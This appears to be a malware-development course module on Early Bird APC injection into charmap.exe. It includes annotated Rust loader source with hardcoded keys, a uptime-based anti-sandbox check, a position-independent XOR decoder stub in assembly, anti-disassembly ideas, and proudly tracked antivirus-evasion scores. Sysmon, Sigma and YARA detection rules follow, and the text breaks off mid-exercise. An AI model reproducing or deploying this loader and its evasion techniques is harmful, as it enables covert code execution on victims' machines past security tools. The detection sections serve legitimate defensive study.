# Stage 05: Early Bird APC Injection with Remote-Side Decryption — Learning Path

## Module Metadata

| Field | Value |
|-------|-------|
| **Module Name** | Early Bird APC Injection & Multi-Layer Payload Protection |
| **Level** | Intermediate-Advanced |
| **Estimated Time** | 6-8 hours |
| **Category** | Windows Internals / Injection / Cryptanalysis / Detection Engineering |
| **Platform** | Windows x64 |
| **Binary** | `process-inject.exe` / `svcctl.exe` (~279KB, Rust, PE64) |
| **Prerequisites** | Stage 03 (AES/RC4 crypto), Stage 04 (API hashing concepts) |
| **VT Score** | **0/76 → 3/76** (achieved 0/76 on 2026-03-12, decayed due to sample burning) |

### VT Detection Journey

```
 ██████████████████████████████████████ 0/76  ← ACHIEVED (March 12, 2026)
 ████████████████████████████████████░░ 3/76  ← CURRENT  (March 17, 2026)
                                               ESET Agent.ION (sample-burned)
                                               CrowdStrike win/malicious_confidence_60% (ML)
                                               Elastic malicious (moderate confidence) (ML)

 Different detection profile from Stages 01-04. CrowdStrike and Elastic flag this
 binary (not AVG/Avast) because the IAT contains cross-process injection APIs:
 CreateProcessW, VirtualAllocEx, WriteProcessMemory, QueueUserAPC, ResumeThread.
 These are directly imported via windows-sys — no PEB-walking hides them.

 The trade-off: Stages 01-04 hide APIs (PEB walking) but get caught by ESET/AVG
 on common library patterns. Stage 05 exposes APIs (direct imports) but gets
 caught by CrowdStrike/Elastic on the injection API combination. Different
 evasion, different detection — the arms race continues.
```

---

## Why This Stage Exists — The Bridge from Stage 04

Stages 01-04 execute shellcode in their own process. This has a fundamental problem: **the malware process IS the suspicious process**. If a SOC analyst identifies your binary, they know where to look. Memory scanners find the shellcode in YOUR address space. Process termination kills both the loader and the payload.

**Stage 05 breaks this model.** The shellcode runs inside `charmap.exe` — a legitimate Windows utility. Even if the analyst kills the loader process, the shellcode survives in charmap. Memory scanners must now scan EVERY process, not just the suspect one.

**Three critical innovations in this stage:**
1. **Cross-process execution**: Shellcode runs in another process's context (T1055.004)
2. **APC injection**: No `CreateRemoteThread` call — bypasses Sysmon Event ID 8
3. **Remote-side decryption**: The injector NEVER holds plaintext shellcode. The final XOR layer is removed by a stub running inside the target process

**What your Stage 04 detections DON'T catch:**
- Your YARA rule targeting PEB-walking patterns? This binary doesn't PEB-walk. It uses direct IAT imports (windows-sys)
- Your Sigma rule targeting RW→RX transitions in the same process? The injection is cross-process — different handles, different events
- Your behavioral "unusual parent spawning CreateThread" rule? No CreateThread. APC injection instead

**What DOES still work**: The VirtualProtect RW→RX(or RWX) transition — but now in a REMOTE process. ETW still sees it, but Sysmon Event 8 does NOT fire.

### Real-World Context (2025-2026)

- **Avantguard: Threadless Ops** ([2025](https://avantguard.io/en/blog/threadless-ops)) — Advanced injection using remote function hooking, eliminating even APC calls. The evolution BEYOND Stage 05
- **Cobalt Strike 4.11** (May 2025) — Added new injection primitives and indirect syscall support for the injection chain
- **Maldev Academy: GhostlyHollowing via Tampered Syscalls** ([Jan 2026](https://github.com/Maldev-Academy/GhostlyHollowingViaTamperedSyscalls2)) — Remote PE injection bypassing userland hooks
- **cocomelonc: Process Injection Series** ([21 parts](https://cocomelonc.github.io/tutorial/2021/09/18/malware-injection-1.html)) — Covers CRT, APC, hollowing, module stomping, section mapping, and more in C
- **kr0tt: Early Exception Handling** ([2025](https://kr0tt.github.io/posts/early-exception-handling/)) — Threadless injection without VEH/SEH

---

## Prerequisites

Before starting this module, you should be comfortable with:
- AES/RC4 decryption from Stage 03
- Memory protection constants (PAGE_READWRITE, PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE)
- Process creation concepts and Windows security model basics
- x86_64 assembly reading (MOV, LEA, XOR, JMP, CMP, conditional jumps)
- Debugging with x64dbg (breakpoints, register inspection, memory view)

**Software needed**:
- Ghidra 11.x (free) or IDA Free/Pro
- x64dbg + ScyllaHide plugin
- Python 3.10+
- Process Monitor (Sysinternals)
- Process Hacker or Process Explorer
- (Optional) Unicorn Engine for stub emulation

---

## Learning Objectives

By the end of this module, you will be able to:

1. **Explain** the Early Bird APC injection technique step-by-step, including why it differs from CreateRemoteThread injection
2. **Identify** APC injection in a binary by recognizing the characteristic API chain (`CreateProcessW(SUSPENDED)` → `VirtualAllocEx` → `WriteProcessMemory` → `VirtualProtectEx` → `QueueUserAPC` → `ResumeThread`)
3. **Understand** why RWX memory is required when a decoder stub performs in-place decryption in the remote process
4. **Trace** multi-layer encryption (position mask → AES → XOR) and identify where each layer is removed
5. **Reverse-engineer** a position-independent x86_64 decoder stub using RIP-relative addressing
6. **Distinguish** between "Early Bird" APC injection (spawn + suspend) and standard APC injection (target existing thread)
7. **Explain** the `KUSER_SHARED_DATA` anti-sandbox technique and why it evades API-level hooks
8. **Write** detection rules (YARA, Sigma) tailored to APC injection patterns
9. **Compare** this technique with Stages 01-04 (local execution) and Stage 06 (single-layer APC)

---

## Section 0: Source Code Deep Dive — The Shortest Main in the Framework

Stage 05's `main.rs` is only **76 lines** — the shortest of any Goodboy crate. Yet it performs the most complex operation: triple-encrypted cross-process APC injection. The brevity comes from delegating to the common library's `apc::inject_with_decoder()`.

### Annotated Source

```rust
#![windows_subsystem = "windows"]

use common::crypto::aes;          // RC4-based "AES" (mislabeled — same as Stage 03)
use common::injection::apc;       // APC injection module — THE core of this stage
// ^^^ NOTE: This binary does NOT use common::evasion::apihash.
// The injection APIs (CreateProcessW, VirtualAllocEx, WriteProcessMemory,
// QueueUserAPC, ResumeThread) are imported DIRECTLY via windows-sys inside
// the apc module. They appear in the binary's IAT.
//
// EVASION TRADE-OFF: Stages 01-04 hide APIs via PEB walking → invisible to IAT
// analysis but PEB-walk code patterns trigger ESET. Stage 05 uses direct IAT
// imports → visible to IAT analysis but no PEB-walk pattern. Different technique,
// different detection surface. This is why CrowdStrike and Elastic flag this
// binary (injection API combo in IAT) while AVG/Avast don't (no PEB-walk pattern).

const AES_KEY: [u8; 32] = [
    0xb7, 0x3a, 0x91, 0xd4, 0x58, 0xf2, 0x0e, 0x6c,
    0xa5, 0x43, 0x7f, 0xe8, 0x1b, 0xcd, 0x69, 0x30,
    0x82, 0xf5, 0x47, 0x0a, 0xde, 0x63, 0xb9, 0x14,
    0x7c, 0xe1, 0x56, 0x2d, 0x93, 0xa8, 0x05, 0x4f,
];
// ^^^ 32-byte key for the RC4 "AES" layer. Different from Stage 03's key.
// Stored in .rdata — visible to any analyst who reads the binary.

const MASKED_SHELLCODE: &[u8] = &[
    0x59, 0x8c, 0x48, 0x16, /* ... 318 bytes total ... */
];
// ^^^ The encrypted payload — 318 bytes of position-masked, AES/RC4-encrypted,
// XOR-encrypted shellcode. Three layers of protection.
//
// Decryption pipeline:
//   MASKED_SHELLCODE (318 bytes)
//     → demask() removes position-dependent XOR  → AES ciphertext (318 bytes)
//     → aes::decrypt() removes RC4 envelope      → intermediate (302 bytes)
//     → XOR with INNER_KEY (in remote process)   → plaintext shellcode (302 bytes)

fn demask(data: &[u8]) -> Vec<u8> {
    data.iter()
        .enumerate()
        .map(|(i, &b)| b ^ ((i as u8).wrapping_mul(0x37).wrapping_add(0x5A)))
        .collect()
}
// ^^^ Position mask: each byte XOR'd with (index * 0x37 + 0x5A) mod 256.
// Purpose: disrupt the statistical properties of the AES ciphertext in .rdata.
// Without this, the encrypted blob would have uniform byte distribution (~7.9
// entropy) — a classic ML signal. The position mask makes it look less structured.

fn main() {
    if !common::benign::preflight() { return; }
    // ^^^ Gate 1: Benign code dilution (HashMap, BTreeMap, fs::read_dir).
    // No init_app_environment() or window lifecycle in this binary — simpler
    // structure than Stages 01-04.

    let ok = unsafe {
        core::ptr::read_volatile(0x7FFE0320usize as *const i64) > 300_000
    };
    if !ok { return; }
    // ^^^ Gate 2: KUSER_SHARED_DATA uptime check. If system uptime < ~5 minutes,
    // exit silently. No API call — reads directly from kernel-mapped page.
    // This is the anti-sandbox gate for this stage.

    unsafe {
        let ciphertext = demask(MASKED_SHELLCODE);           // Layer 1: remove position mask
        let intermediate = match aes::decrypt(&ciphertext, &AES_KEY) {
            Ok(s) => s,
            Err(_) => return,                                 // Layer 2: RC4 decrypt
        };
        // ^^^ At this point, `intermediate` is XOR'd data (first byte 0x38).
        // It is NOT plaintext shellcode. The injector never holds the plaintext.

        let k: [u8; 16] = [
            0xd1, 0x7b, 0xe3, 0x4c, 0x85, 0xf0, 0x29, 0xa6,
            0x3d, 0x92, 0x58, 0xc7, 0x0e, 0xb4, 0x6f, 0x13,
        ];
        // ^^^ INNER_KEY for the final XOR layer. This key + intermediate are
        // sent to the remote process, where a 41-byte decoder stub XOR-decrypts
        // them in-place.

        let target = "C:\\Windows\\System32\\charmap.exe";
        let _ = apc::inject_with_decoder(&intermediate, &k, Some(target));
        // ^^^ THE INJECTION. This single function call:
        //   1. CreateProcessW(charmap.exe, CREATE_SUSPENDED)
        //   2. Builds [stub(41) + key(16) + intermediate(302)] = 359 bytes
        //   3. VirtualAllocEx(RW) in charmap's address space
        //   4. WriteProcessMemory(combined payload)
        //   5. VirtualProtectEx(RWX) — the memory must be read+write+execute
        //   6. QueueUserAPC(stub_address) on the suspended thread
        //   7. ResumeThread — stub runs, XOR decrypts, jumps to shellcode
        //
        // After this returns, the shellcode is executing inside charmap.exe.
        // The injector process can exit — the payload survives independently.
    }
}
```

### Architecture Comparison: Stage 04 vs Stage 05

```
Stage 04 (local execution):         Stage 05 (remote APC injection):
┌───────────────────────┐            ┌───────────────────────┐
│ netdiag.exe           │            │ process-inject.exe    │
│                       │            │                       │
│ XOR decrypt shellcode │            │ demask + AES decrypt  │
│ PEB walk → resolve    │            │ (intermediate only)   │
│ VirtualAlloc(RW)      │            │                       │
│ Copy shellcode        │            │ CreateProcessW(SUSP)  │
│ VirtualProtect(RX)    │            │ VirtualAllocEx(RW)    │
│ CreateThread(SC)      │            │ WriteProcessMemory    │
│ [shellcode runs here] │            │ VirtualProtectEx(RWX) │
│                       │            │ QueueUserAPC          │
└───────────────────────┘            │ ResumeThread          │
                                     │ [exit — job done]     │
                                     └───────────────────────┘
                                              │
                                     ┌────────▼──────────────┐
                                     │ charmap.exe           │
                                     │                       │
                                     │ [stub XOR decrypts]   │
                                     │ [shellcode runs here] │
                                     └───────────────────────┘
```

Key differences:
- Stage 04: everything in one process, PEB walking, RW→RX (W^X)
- Stage 05: two processes, direct IAT imports, RW→RWX, plaintext never in injector

---

## Section 1: Theory — From Local Execution to Remote-Side Decryption

### Evolution of Payload Protection

Stages 01-04 used **local execution**: decrypt the shellcode in the malware process, then run it in-process via `VirtualAlloc` → `CreateThread`. This has a critical weakness — the decrypted shellcode exists in the malware's memory, where memory scanners can find it.

Stage 05 introduces two advances:

| Aspect | Stages 01-04 (Local) | Stage 05 (Remote-Side Decryption) |
|--------|---------------------|-----------------------------------|
| **Where shellcode is decrypted** | In the injector's memory | In the target process (charmap.exe) |
| **Plaintext shellcode in injector?** | Yes — between decrypt and execution | **No** — only the XOR'd intermediate exists |
| **Execution context** | Malware process | Legitimate process (charmap.exe) |
| **Process creation** | None — runs in-process | `CreateProcessW(CREATE_SUSPENDED)` |
| **Thread creation** | `CreateThread` (same process) | `QueueUserAPC` + `ResumeThread` (different process) |
| **Memory protection** | RW → RX (W^X) | RW → **RWX** (stub must write AND execute) |
| **Encryption layers** | 1-2 (XOR or AES) | 3 (position mask + AES + remote XOR) |

### Why Remote-Side Decryption?

The key innovation is that the **injector never holds the plaintext shellcode**:

```
Injector's memory:                     Target's memory (charmap.exe):
┌──────────────────┐                   ┌──────────────────────────────┐
│ MASKED_SHELLCODE │──demask──►        │                              │
│ (position XOR)   │          │        │                              │
├──────────────────┤          ▼        │                              │
│ AES_KEY          │──decrypt──►       │                              │
├──────────────────┤          │        │                              │
│                  │          ▼        │                              │
│ intermediate     │◄─────────┘        │                              │
│ (XOR'd, 0x38..)  │                   │                              │
│ *** NOT shellcode│                   │                              │
├──────────────────┤                   │                              │
│ INNER_KEY        │                   │                              │
│ (16 bytes)       │                   │                              │
├──────────────────┤                   │                              │
│ XOR stub         │                   │                              │
│ (41 bytes)       │                   │                              │
└──────────────────┘                   │                              │
         │                             │                              │
         │ WriteProcessMemory          │                              │
         │ [stub + key + intermediate] │                              │
         └────────────────────────────►│ ┌──────────┬────┬──────────┐ │
                                       │ │ stub(41) │key │inter(302)│ │
                                       │ └──────────┴────┴──────────┘ │
                                       │        │                     │
                                       │  QueueUserAPC + Resume       │
                                       │        ▼                     │
                                       │  stub XOR-decrypts inter     │
                                       │        ▼                     │
                                       │ ┌──────────┬────┬──────────┐ │
                                       │ │ stub(41) │key │SHELLCODE │ │
                                       │ └──────────┴────┴──────────┘ │
                                       │                  ▲ JMP here  │
                                       └──────────────────────────────┘
```

**Forensic implication**: If a memory scanner dumps the injector's heap, it finds the intermediate (XOR'd data starting with `0x38`), not the shellcode (which would start with `0xE9` or `0xFC`). The plaintext shellcode only ever exists inside charmap.exe.

### Exercise 1.1: Encryption Layer Analysis

**Question**: If an analyst dumps the injector's memory at the moment before `WriteProcessMemory` is called, what will they find? Can they recover the shellcode from this dump alone?

<details>
<summary>Answer</summary>

They will find:
1. The XOR'd intermediate (302 bytes, first byte `0x38`) — this is the AES-decrypted but still XOR-encrypted data
2. The `INNER_KEY` (16 bytes) — stored as a local variable
3. The decoder stub (41 bytes) — position-independent code

**Yes**, they CAN recover the shellcode from this dump — the INNER_KEY is present alongside the intermediate. XOR decryption is trivial:

```python
shellcode = bytes(intermediate[i] ^ inner_key[i % 16] for i in range(len(intermediate)))
```

However, **automated memory scanners** won't recognize the intermediate as shellcode because it doesn't match any known shellcode signature (it starts with `0x38`, not a recognizable prologue). This is the real evasion value — pattern-matching scanners miss it.

A sophisticated analyst can still recover it manually, but the automated tools that scan thousands of processes per second will not flag it.
</details>

### Exercise 1.2: Why charmap.exe?

**Question**: The binary injects into `charmap.exe` (Character Map). Why is this a reasonable injection target? What are the trade-offs compared to `svchost.exe` or `notepad.exe`?

<details>
<summary>Answer</summary>

| Target | Pros | Cons |
|--------|------|------|
| **charmap.exe** | Always present on Windows; user-mode (Medium integrity); small and simple (unlikely to crash); GUI app (window messages expected) | Unusual to see running unprompted; no network activity expected |
| **notepad.exe** | Common, benign reputation | Must be pre-launched or spawned; no network activity expected |
| **svchost.exe** | Network activity expected; many instances | Runs as SYSTEM (requires elevation); PPL protection possible; crashing it affects system stability |

`charmap.exe` is a compromise: it's universally available, doesn't require elevation, and is simple enough that injection is unlikely to crash it. The CREATE_SUSPENDED approach means the injector spawns its own instance — no need to find a running process.

Stage 06 uses `notepad.exe` as the target — another GUI utility that's universally available and doesn't require elevation. See Stage 06's LEARNING_PATH for the target selection trade-off analysis.
</details>

---

## Section 2: The Injection Chain — API by API

### Step 1: CreateProcessW (Spawn Suspended)

```c
BOOL CreateProcessW(
    LPCWSTR lpApplicationName,  // "C:\\Windows\\System32\\charmap.exe"
    LPWSTR  lpCommandLine,      // NULL
    ...
    DWORD   dwCreationFlags,    // CREATE_SUSPENDED (0x00000004)
    ...
    LPSTARTUPINFOW lpStartupInfo,
    LPPROCESS_INFORMATION lpProcessInformation  // receives handles
);
```

**Why CREATE_SUSPENDED?**: The new process is created but its main thread never starts executing. This gives the injector time to:
1. Allocate memory in the target
2. Write the payload
3. Queue an APC

When the thread eventually resumes, it processes the APC queue BEFORE reaching the process entry point — this is the "Early Bird" technique.

**Key difference from CreateRemoteThread injection**: No `OpenProcess` is needed. The injector is the **parent process** — it already has full access to the child's handle from `PROCESS_INFORMATION`.

### Step 2: VirtualAllocEx (Allocate in Target)

```c
LPVOID VirtualAllocEx(
    HANDLE hProcess,          // from pi.hProcess
    LPVOID lpAddress,         // NULL (OS chooses)
    SIZE_T dwSize,            // 359 bytes (stub + key + intermediate)
    DWORD  flAllocationType,  // MEM_COMMIT | MEM_RESERVE (0x3000)
    DWORD  flProtect          // PAGE_READWRITE (0x04)
);
```

Note the size is **359 bytes** (41 + 16 + 302), not the shellcode size alone. The stub and key are part of the allocation.

### Step 3: WriteProcessMemory (Write Combined Payload)

```c
BOOL WriteProcessMemory(
    HANDLE  hProcess,         // target process handle
    LPVOID  lpBaseAddress,    // address from VirtualAllocEx
    LPCVOID lpBuffer,         // pointer to [stub + key + intermediate]
    SIZE_T  nSize,            // 359 bytes
    SIZE_T  *lpNumberOfBytesWritten
);
```

The buffer contains the concatenated payload: `[stub(41) | key(16) | intermediate(302)]`. The intermediate is still XOR-encrypted — it will be decrypted by the stub after execution begins.

### Step 4: VirtualProtectEx (RW → RWX)

```c
BOOL VirtualProtectEx(
    HANDLE hProcess,          // target process handle
    LPVOID lpAddress,         // address from VirtualAllocEx
    SIZE_T dwSize,            // 359 bytes
    DWORD  flNewProtect,      // PAGE_EXECUTE_READWRITE (0x40)
    PDWORD lpflOldProtect     // receives 0x04 (was RW)
);
```

**Critical difference from Stages 01-04**: The memory transitions to **RWX (0x40)**, not RX (0x20).

Why? The decoder stub must:
1. **READ** the key bytes (at offset 41)
2. **WRITE** the decrypted bytes over the intermediate (at offset 57)
3. **EXECUTE** — the stub itself runs, then jumps to the decrypted shellcode

All three operations happen in the same memory region. W^X is impossible.

### Step 5: QueueUserAPC (Queue Execution)

```c
DWORD QueueUserAPC(
    PAPCFUNC  pfnAPC,    // remote_addr (start of stub)
    HANDLE    hThread,   // suspended thread handle from pi.hThread
    ULONG_PTR dwData     // 0 (no parameter)
);
```

This queues the stub as an **Asynchronous Procedure Call** on the suspended thread. APCs are processed when a thread enters an "alertable" state — which happens automatically when a newly created thread begins execution.

### Step 6: ResumeThread (Trigger Execution)

```c
DWORD ResumeThread(
    HANDLE hThread    // pi.hThread
);
```

The suspended thread resumes. Before reaching charmap.exe's entry point, it processes its APC queue. The stub executes:
1. XOR-decrypts the intermediate in-place
2. Jumps to the now-plaintext shellcode
3. Shellcode runs in charmap.exe's context

### Exercise 2.1: Memory Protection Timeline

**Draw a timeline of the memory protection state for the injected region in charmap.exe**.

<details>
<summary>Answer</summary>

```
Time ──────────────────────────────────────────────────────────────────────────────►

VirtualAllocEx    WriteProcessMemory    VirtualProtectEx    QueueUserAPC+Resume
     │                  │                     │                    │
     ▼                  ▼                     ▼                    ▼
┌─────────┐       ┌──────────┐          ┌──────────┐        ┌──────────────────┐
│   RW    │──w──► │   RW     │──prot──► │   RWX    │──exec─►│     RWX          │
│ (0x04)  │  ok   │ (0x04)   │  change  │ (0x40)   │  stub  │ Stub runs:       │
│ empty   │       │ stub+key │          │ stub+key │  runs  │ 1. XOR decrypt   │
│         │       │ +inter   │          │ +inter   │        │ 2. JMP shellcode │
└─────────┘       └──────────┘          └──────────┘        └──────────────────┘

Key: RW = Read+Write (0x04), RWX = Read+Write+Execute (0x40)
     The memory IS RWX — required for in-place stub decryption + execution.
     W^X is NOT maintained (contrast with Stages 01-04 and Stage 06).
```

**Detection signal**: `PAGE_EXECUTE_READWRITE` (0x40) in a cross-process `VirtualProtectEx` call is a strong indicator. However, Stage 06 uses `PAGE_EXECUTE_READ` (0x20) — so this signal is specific to crate 05's decoder stub pattern.
</details>

### Exercise 2.2: Parent-Child Process Relationship

**Question**: In CreateRemoteThread injection, the injector opens an existing process. In Early Bird APC injection, the injector creates the process. How does this affect detection?

<details>
<summary>Answer</summary>

| Aspect | CreateRemoteThread | Early Bird APC |
|--------|-------------------|----------------|
| **Process relationship** | Injector opens arbitrary process | Injector is the PARENT of the target |
| **Sysmon Event 10 (ProcessAccess)** | Shows OpenProcess with high-access rights | Not generated — parent has inherent access |
| **Sysmon Event 1 (ProcessCreate)** | Not generated by injector | Shows suspicious parent spawning charmap.exe |
| **PROCESS_ALL_ACCESS** | Explicitly requested | Implicit in parent-child relationship |
| **Process tree** | Independent processes | `process-inject.exe → charmap.exe` (parent-child) |

**Detection opportunity**: A process tree showing `process-inject.exe → charmap.exe` is suspicious — why would an unknown binary spawn Character Map? This parent-child relationship is a strong behavioral signal that CreateRemoteThread injection avoids (the processes are unrelated in the process tree).

**Detection gap**: No `ProcessAccess` event (Event 10) is generated because the parent doesn't need to `OpenProcess` — it already has the handle from `CreateProcessW`. This removes a key detection signal.
</details>

---

## Section 3: The Anti-Sandbox Check — KUSER_SHARED_DATA

### What is KUSER_SHARED_DATA?

`KUSER_SHARED_DATA` is a kernel structure mapped read-only at virtual address `0x7FFE0000` in every user-mode process. It contains system-wide data that applications can read without making any API calls:

| Offset | Field | Type | Use |
|--------|-------|------|-----|
| `0x000` | `TickCountLowDeprecated` | ULONG | Legacy tick count |
| `0x014` | `NtSystemRoot` | WCHAR[260] | System root path |
| `0x2C4` | `KdDebuggerEnabled` | BOOLEAN | Kernel debugger status |
| `0x308` | `SystemTime` | KSYSTEM_TIME | Current system time |
| `0x320` | **`TickCountQuad`** | LONGLONG | **High-resolution tick count** |

### How Stage 05 Uses It

```rust
let ok = unsafe {
    core::ptr::read_volatile(0x7FFE0320usize as *const i64) > 300_000
};
if !ok { return; }
```

This reads `TickCountQuad` directly from the mapped page — no API call is made. The value is approximately milliseconds since system boot. If the system has been running for less than ~300,000 ms (~5 minutes), the binary exits silently.

### Why This Evades API Hooks

Traditional sandbox evasion uses API calls like `GetTickCount()`, `GetTickCount64()`, or `NtQuerySystemTime()`. EDR products hook these APIs and can fake the return values. But reading `KUSER_SHARED_DATA` directly:
- Makes no API call — there's nothing to hook in user-mode
- The kernel maps this page — modifying it requires kernel-level intervention
- It's a simple memory read — indistinguishable from reading any other memory location
- The only detection is monitoring the actual memory access pattern (requires hardware breakpoints or kernel-level monitoring)

### Exercise 3.1: KUSER_SHARED_DATA Bypass

**Question**: You're analyzing this binary in a fresh VM that was just booted 30 seconds ago. How would you bypass the uptime check?

<details>
<summary>Answer</summary>

**Method 1 — Wait**: Let the VM run for 5+ minutes before executing the binary. Simplest approach.

**Method 2 — Patch the binary**: Find the `cmp rax, 300000` / `jle` pattern in the disassembly. NOP the conditional jump (replace `0F 8E xx xx xx xx` with `90 90 90 90 90 90`).

**Method 3 — Debugger manipulation**: Set a breakpoint on the `cmp` instruction. When hit, set RAX to a large value (e.g., `0x7FFFFFFF`) so the comparison passes.

**Method 4 — Modify KUSER_SHARED_DATA**: This requires a kernel driver or debugger with kernel access. Map the page writable and change the value at offset `0x320`. Not practical in most analysis scenarios.

**Method 5 — Emulation**: Use a CPU emulator (Unicorn, Qiling) that allows you to control the memory layout. Map `0x7FFE0000` with a fake structure where `TickCountQuad` is a large value.
</details>

---

## Section 4: The XOR Decoder Stub — Position-Independent Code

### Stub Disassembly

The 41-byte decoder stub is position-independent x86_64 code:

```asm
; === Setup: locate key and data via RIP-relative addressing ===
0x00: 48 8D 3D 22 00 00 00    lea rdi, [rip + 0x22]    ; rdi → key (at offset 41)
0x07: 48 8D 35 2B 00 00 00    lea rsi, [rip + 0x2B]    ; rsi → intermediate (at offset 57)
0x0E: B9 2E 01 00 00          mov ecx, 0x012E          ; ecx = 302 (intermediate length)
0x13: 31 D2                   xor edx, edx             ; edx = 0 (loop counter i)

; === XOR decryption loop ===
0x15: 89 D0                   mov eax, edx             ; eax = i
0x17: 83 E0 0F                and eax, 0x0F            ; eax = i & 15 = i % 16
0x1A: 0F B6 04 07             movzx eax, byte [rdi+rax]; eax = key[i % 16]
0x1E: 30 04 16                xor byte [rsi+rdx], al   ; intermediate[i] ^= key[i%16]
0x21: FF C2                   inc edx                  ; i++
0x23: 39 CA                   cmp edx, ecx             ; i < 302?
0x25: 7C EE                   jl 0x15                  ; loop

; === Jump to decrypted shellcode ===
0x27: FF E6                   jmp rsi                  ; jump to intermediate (now plaintext)
```

### RIP-Relative Addressing Explained

The stub uses `lea rdi, [rip + 0x22]` to find the key. How does this work?

When the CPU executes `lea rdi, [rip + 0x22]` at offset 0x00:
- The instruction is 7 bytes long (48 8D 3D 22 00 00 00)
- RIP points to the NEXT instruction = offset 0x07
- `rip + 0x22` = 0x07 + 0x22 = 0x29 — but wait, this is offset 41 in decimal

Similarly, `lea rsi, [rip + 0x2B]` at offset 0x07:
- Instruction is 7 bytes, so RIP = 0x0E
- `rip + 0x2B` = 0x0E + 0x2B = 0x39 = 57 decimal

This is **position-independent** — no matter where in memory the stub is loaded, the LEA instructions always correctly point to the key and data that follow the stub in the same allocation.

### Exercise 4.1: Stub Modification

**Task**: The current stub uses a 16-byte XOR key (`and eax, 0x0F`). How would you modify the stub to support a 32-byte key?

<details>
<summary>Answer</summary>

Change the key index mask from `0x0F` (mod 16) to `0x1F` (mod 32):

```asm
; Before (16-byte key):
0x17: 83 E0 0F    and eax, 0x0F    ; i % 16

; After (32-byte key):
0x17: 83 E0 1F    and eax, 0x1F    ; i % 32
```

Only ONE byte changes: offset 0x19 from `0x0F` to `0x1F`. The RIP-relative offsets for the key and data would also need adjustment since the key is now 32 bytes instead of 16, pushing the intermediate data further back.

New layout: `[stub(41) + key(32) + intermediate(302)] = 375 bytes`

The LEA offsets would change:
- `lea rdi, [rip + 0x22]` → stays the same (key still at offset 41)
- `lea rsi, [rip + 0x2B]` → becomes `lea rsi, [rip + 0x3B]` (data now at offset 41+32=73)
</details>

### Exercise 4.2: Anti-Disassembly

**Question**: How could the stub be modified to resist static disassembly while maintaining the same functionality?

<details>
<summary>Answer</summary>

Several techniques:

1. **Opaque predicates**: Add conditional jumps that always take the same path but confuse disassemblers:
```asm
xor eax, eax
test eax, eax
jnz fake_target    ; never taken, but disassembler may follow
```

2. **Self-modifying prologue**: The first few bytes of the stub overwrite themselves with the real instructions, then jump back to execute them. Since the memory is RWX, this is possible.

3. **Junk byte insertion**: Insert bytes that look like multi-byte instruction prefixes between real instructions. Linear disassemblers will misparse everything after the junk byte.

4. **Indirect jumps**: Replace direct jumps with `push addr; ret` or `lea rax, [target]; jmp rax` patterns.

The current stub prioritizes simplicity (41 bytes, easy to verify) over anti-analysis.
</details>

---

## Section 5: Detection Engineering — Catching APC Injection

### ETW Signals for APC Injection

APC injection generates different ETW events than CreateRemoteThread:

| ETW Provider | Event | Trigger | Applicability |
|-------------|-------|---------|---------------|
| Microsoft-Windows-Kernel-Process | ProcessStart | `CreateProcessW` spawns charmap.exe | **HIGH** — shows unusual parent |
| Microsoft-Windows-Kernel-Process | ThreadStart | Suspended thread resumes | **LOW** — looks normal |
| Microsoft-Windows-Kernel-Memory | VirtualAlloc | Remote allocation in target | **HIGH** — cross-process alloc |
| Microsoft-Windows-Kernel-Memory | ProtectVirtualMemory | RW → RWX transition | **CRITICAL** — RWX is rare |
| Microsoft-Windows-Threat-Intelligence | N/A | APC queuing (requires kernel driver) | **CRITICAL** — direct detection |

**Key gap**: Sysmon does NOT have a dedicated event for `QueueUserAPC`. There is no "Event ID 8" equivalent for APC injection. This is a significant detection blind spot for Sysmon-only environments.

### Sysmon Detection Rules

```xml
<!-- Sysmon Event ID 1: Suspicious Process Creation (Early Bird indicator) -->
<RuleGroup groupRelation="or">
    <ProcessCreate onmatch="include">
        <!-- Unusual parent spawning GUI utilities -->
        <Image condition="end with">charmap.exe</Image>
        <ParentImage condition="excludes">explorer.exe</ParentImage>
        <ParentImage condition="excludes">cmd.exe</ParentImage>
        <ParentImage condition="excludes">powershell.exe</ParentImage>
    </ProcessCreate>
</RuleGroup>

<!-- Note: Sysmon does NOT generate Event ID 8 for QueueUserAPC.
     CreateRemoteThread detection rules will NOT catch this technique.
     Detection relies on the parent-child process relationship (Event 1). -->
```

### Sigma Rule: Early Bird APC Injection

```yaml
title: Suspicious Process Spawned in Suspended State (Early Bird APC)
id: e7f3a9b2-4d1c-5e8f-a0b3-stage05earlybird
status: experimental
description: >
  Detects unusual parent processes spawning common Windows utilities,
  which may indicate Early Bird APC injection. The attacker spawns
  a target process in suspended state, writes payload, and queues an APC.
logsource:
    product: windows
    category: process_creation
detection:
    selection_target:
        Image|endswith:
            - '\charmap.exe'
            - '\notepad.exe'
            - '\mspaint.exe'
            - '\calc.exe'
    filter_legitimate_parents:
        ParentImage|endswith:
            - '\explorer.exe'
            - '\cmd.exe'
            - '\powershell.exe'
            - '\conhost.exe'
            - '\RuntimeBroker.exe'
    condition: selection_target and not filter_legitimate_parents
level: high
tags:
    - attack.defense_evasion
    - attack.t1055.004
    - attack.execution
falsepositives:
    - Automation tools launching GUI utilities
    - Custom launchers or accessibility software
```

### YARA Rule: APC Injection Pattern

```yara
rule EarlyBird_APC_Injection
{
    meta:
        description = "Detects binaries with Early Bird APC injection capability"
        author = "Goodboy Course"
        stage = "05"
        severity = "high"
        mitre = "T1055.004"

    strings:
        // CreateProcessW + CREATE_SUSPENDED pattern
        $create_suspended = { 04 00 00 00 }  // CREATE_SUSPENDED flag

        // Memory protection constants
        $mem_rw = { 04 00 00 00 }   // PAGE_READWRITE
        $mem_rwx = { 40 00 00 00 }  // PAGE_EXECUTE_READWRITE

        // MEM_COMMIT | MEM_RESERVE
        $mem_alloc = { 00 30 00 00 }

        // Import strings (windows-sys FFI)
        $imp_create = "CreateProcessW" ascii
        $imp_alloc = "VirtualAllocEx" ascii
        $imp_write = "WriteProcessMemory" ascii
        $imp_protect = "VirtualProtectEx" ascii
        $imp_apc = "QueueUserAPC" ascii
        $imp_resume = "ResumeThread" ascii

        // KUSER_SHARED_DATA anti-sandbox
        $kuser = { 20 03 FE 7F }  // 0x7FFE0320 (TickCountQuad offset)

    condition:
        uint16(0) == 0x5A4D and
        4 of ($imp_*) and
        $mem_rwx and
        $kuser
}
```

### Exercise 5.1: Detection Gap Analysis

**Question**: An attacker replaces `QueueUserAPC` with `NtQueueApcThread` (the underlying NT API) and uses direct syscalls instead of `kernel32.dll` imports. Which detection methods still work?

<details>
<summary>Answer</summary>

| Detection Method | Still Works? | Why? |
|-----------------|-------------|------|
| Sysmon Event ID 1 (ProcessCreate) | **YES** | The parent-child relationship still exists — charmap.exe is still spawned by the injector |
